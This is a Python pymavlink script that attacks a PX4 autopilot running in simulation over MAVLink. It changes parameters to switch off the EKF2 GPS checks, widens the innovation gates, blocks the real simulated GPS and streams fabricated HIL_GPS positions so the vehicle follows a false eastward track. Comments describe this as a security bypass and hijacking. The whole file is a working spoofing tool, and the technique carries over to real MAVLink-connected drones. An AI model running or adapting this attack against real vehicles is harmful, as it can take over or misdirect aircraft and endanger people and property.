#!/usr/bin/env python3
import time
import math
import threading
from pymavlink import mavutil

# --- PX4 SITL COMMUNITY SOLUTION CONFIG ---
# Use 14540 to match the user's previously working setup but with better params
CONNECTION = "udp:127.0.0.1:14540" 
SYS_ID = 1 
COMP_ID = 1

# Global variables
drone_reported_lon = 0.0
drone_reported_lat = 0.0
px4_time_offset_us = 0 
running = True

def listener_thread(conn):
    global drone_reported_lon, drone_reported_lat, px4_time_offset_us, running
    while running:
        msg = conn.recv_match(blocking=True, timeout=1.0)
        if not msg: continue
        
        mtype = msg.get_type()
        if mtype == 'GLOBAL_POSITION_INT':
            drone_reported_lat = msg.lat / 1e7
            drone_reported_lon = msg.lon / 1e7
        elif mtype == 'SYSTEM_TIME':
            # Synchronize our clock with PX4 for security bypass
            px4_time_offset_us = msg.time_boot_ms * 1000 - int(time.time() * 1e6)

def main():
    global running
    print(f"[*] Connecting to {CONNECTION}...")
    conn = mavutil.mavlink_connection(CONNECTION, source_system=SYS_ID)
    conn.wait_heartbeat()
    print(f"[+] Connected. System ID: {conn.target_system}")

    # 1. FORCE PARAMETERS (Use Valid Ranges found in PX4 Source)
    print("[*] Opening EKF gates and Blocking Simulator...")
    def set_p(name, val, ptype):
        conn.mav.param_set_send(conn.target_system, conn.target_component, name.encode(), val, ptype)

    # Research shows EKF2_GPS_P_GATE max is 10.0. 1000.0 is rejected by firmware.
    set_p('MAV_USEHILGPS', 1, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    set_p('SIM_GPS_BLOCK', 1, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    set_p('EKF2_GPS_CHECK', 0, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
    set_p('EKF2_GPS_P_GATE', 10.0, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
    set_p('EKF2_GPS_V_GATE', 10.0, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)

    # 2. STARTING ORIGIN
    # We wait for the first real position so we don't 'teleport' and close the gates
    print("[*] Capturing stable origin...")
    msg = conn.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=5.0)
    if msg:
        lat, lon, alt = msg.lat/1e7, msg.lon/1e7, msg.alt/1000.0
    else:
        # Fallback to Baylands
        lat, lon, alt = 37.4121732, -121.9988781, 41.0
    
    print(f"[+] Origin Locked: {lat:.7f}, {lon:.7f}")

    t = threading.Thread(target=listener_thread, args=(conn,), daemon=True)
    t.start()

    print("\n[!] STARTING HIL_GPS OVERRIDE (5m/s East)...")
    print(f"{'SPOOFED (Sending)':<35} | {'DRONE (Believing)':<35}")
    print("-" * 75)
    
    start_time = time.time()
    R = 6371000.0
    
    try:
        while True:
            elapsed = time.time() - start_time
            d_east = 5.0 * elapsed
            new_lon = lon + math.degrees(d_east / (R * math.cos(math.radians(lat))))
            
            t_now = time.time()
            # Use the synchronized PX4 clock
            time_us = int(t_now * 1e6) + px4_time_offset_us
            
            # Send HIL_GPS (Industry standard for SITL hijacking)
            conn.mav.hil_gps_send(
                time_us, 3, 
                int(lat * 1e7), int(new_lon * 1e7), int(alt * 1000),
                5, 5, # eph/epv (Super high precision forces EKF to follow us)
                int(5.0 * 100), 0, int(5.0 * 100), 0, 
                int(90 * 100), 16, 0, 0
            )
            
            if int(elapsed * 10) % 10 == 0:
                status = "✅ ACCEPTED" if abs(new_lon - drone_reported_lon) < 0.0001 else "❌ REJECTED"
                print(f"Lon: {new_lon:.7f} (+{d_east:.1f}m)    | Lon: {drone_reported_lon:.7f}    {status}")
                
            time.sleep(0.05) # 20Hz (Reliable rate for SITL)
            
    except KeyboardInterrupt:
        running = False
        set_p('SIM_GPS_BLOCK', 0, mavutil.mavlink.MAV_PARAM_TYPE_INT32)
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
